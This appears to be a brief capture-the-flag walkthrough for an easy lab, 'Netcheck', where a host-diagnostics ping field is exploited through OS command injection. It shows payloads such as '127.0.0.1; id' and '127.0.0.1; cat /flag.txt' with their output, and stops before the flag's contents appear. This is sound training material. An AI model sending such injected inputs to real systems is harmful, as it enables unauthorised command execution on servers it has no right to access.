---

Name: Netcheck
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/08/Netcheck
Description: Netcheck is a bootstrapped uptime-monitoring SaaS founded in 2021 by two ex-SRE friends in Lisbon, with about 800 paying teams on plans that start at $19/month. The Manual Diagnostics panel was a sales-led feature, built in an afternoon to close a deal with a customer who wanted "proof from outside our network," and it has been quietly earning revenue ever since. The annual customer audit lands in two weeks and the founders asked you to take a look first. 

---

We can diagnose hosts, trying 127.0.0.1 results in a normal ping output
```

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.051 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.056 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2064ms
rtt min/avg/max/mdev = 0.048/0.051/0.056/0.003 ms
```

Now let's try chaining commands
```
127.0.0.1; id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Since it works let's search for the flag
```
127.0.0.1; find / -name flag.txt 2> /dev/null
```

```
/flag.txt
```

Now we can read it
```
127.0.0.1; cat /flag.txt
```
